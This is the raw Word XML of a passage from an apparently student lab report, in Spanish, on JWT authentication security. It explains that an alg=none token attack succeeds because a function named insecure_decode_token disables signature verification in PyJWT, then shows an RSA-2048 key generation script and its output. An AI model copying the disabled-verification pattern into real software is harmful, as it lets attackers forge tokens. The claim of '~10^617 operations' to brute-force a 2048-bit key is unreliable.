    <w:p w14:paraId="6169C00B" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>¿Por qué funciona este ataque?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F945E8" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>La función insecure_decode_token usa options={'verify_signature': False}. Esto le indica a la biblioteca PyJWT que acepte el token tal cual, sin importar si la firma es válida, inválida o directamente inexistente. Con alg=none el JWT no tiene firma, y el servidor lo acepta igual.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65FB9BF0" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="009A2B0C" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="36"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>3. Generación de Claves RSA-2048</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35720B34" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Para la API segura se utiliza criptografía asimétrica RSA-2048. La clave privada firma los tokens (solo el servidor la conoce) y la clave pública los verifica (puede distribuirse sin riesgo). Incluso si un atacante intercepta la clave pública, no puede forjar tokens.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7324AB4C" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Script de generación con la librería cryptography de Python</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60CC6D02" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="120" w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>generate_keys.py</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="143A2E70" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
          </w:tcPr>
          <w:p w14:paraId="1D7EBCDF" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="22207401"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from cryptography.hazmat.primitives.asymmetric import rsa</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="520F1EA8"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from cryptography.hazmat.primitives import serialization</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2917FA22"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import os</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17E3C1CC"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="178E619D"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os.chdir(os.path.dirname(os.path.abspath(__file__)))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C4387D8"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55BF5211"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private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27BC45E5"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CD2355C"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private_pem = private_key.private_bytes(</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2755FC17"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encoding=serialization.Encoding.PEM,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28B4C6F6"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format=serialization.PrivateFormat.TraditionalOpenSSL,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A41A595"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encryption_algorithm=serialization.NoEncryption()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="037A1348"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D4275F0"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79B36EA5"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public_pem = private_key.public_key().public_bytes(</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73A8B6E2"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encoding=serialization.Encoding.PEM,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A7D018D"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format=serialization.PublicFormat.SubjectPublicKeyInfo</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18B14508"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63B21055"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41297135"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with open("private.pem", "wb") as f:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DE8E068"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f.write(private_pem)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19F5F40A"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B9FD9A9"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with open("public.pem", "wb") as f:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E6DDA73" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="D4D4D4"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="D4D4D4"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>f.write(public_pem)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27622E24" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="D4D4D4"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C90F60A" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="D4D4D4"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>print("Claves RSA generadas exitosamente:")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="603BCB1A"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print("  private.pem - Clave privada (2048 bits)")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70EB8CD1"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print("  public.pem  - Clave pÃºblica")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17862F1B"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print()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11C9D7FB"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print("=== CLAVE PÃšBLICA ===")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="076F825E"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print(public_pem.decode())</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BE8FCE1"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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="17144B58" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="009B1B7B" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Claves generadas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5979ED1D" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">  &gt; CMD – Generación de claves RSA</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="415DC4EB" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0C0C0C"/>
          </w:tcPr>
          <w:p w14:paraId="358A4A8D" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="155AE070" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>C:\...\lab_auth_security&gt; python generate_keys.py</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A60DAAA" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50B18B84" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>Claves RSA generadas exitosamente:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46422609" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  private.pem - Clave privada (2048 bits)  ← SECRETO - nunca compartir</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72BA145D" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">  public.pem  - Clave pública               ← puede distribuirse</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67AC1F9B" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="514565D5" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>=== CLAVE PÚBLICA ===</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E608520" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>-----BEGIN PUBLIC KEY-----</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07E01A49" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAi0oni7b7ihMAoHMQIqh+</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B5D0729" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>OYK+D4pPFCoWZwTZUJEIg9OWXmNBIwC3yzL6Ug1fxakOKrROU1/2XahNtW/I3kLm</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AE882E9" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Tsyl8sxMpxv4/TqRFsRtp72Jy8XcktIBJB6TZMDNDf35Vd/L3SWv/EOdpID1XS6Z</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44F32EBD" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>W4IYuuK2Q0vZ8u+kz+xJBCMRrnDTbQBGrEcA6J+VbIKVb/TU+bXD8d7xlaJSP1CN</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4054D982" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>bZSjWwYXBK3mz8r5rszs+7A8nsfF9jH/KfhBW1Ny0CBxIqhWKs3TcIja1HkIll0d</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="122929B2" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>xuYUfzQ0rFN93B5cHphimt+J/4zOg7mcet+C1HAphsLUuEu+EHVaPD889C4c31tp</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5031407E" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>KwIDAQAB</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C840FC6" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>-----END PUBLIC KEY-----</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="455848BB" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E61F899" w14:textId="6BFCA343" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00233214">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>CRIPTOGRAFÍA ASIMÉTRICA RSA:</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  • La clave PRIVADA (private.pem) FIRMA los tokens → solo el servidor</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  • La clave PÚBLICA (public.pem)  VERIFICA las firmas → cualquiera puede tenerla</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  • 2048 bits → ~10^617 operaciones para romperla por fuerza bruta</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
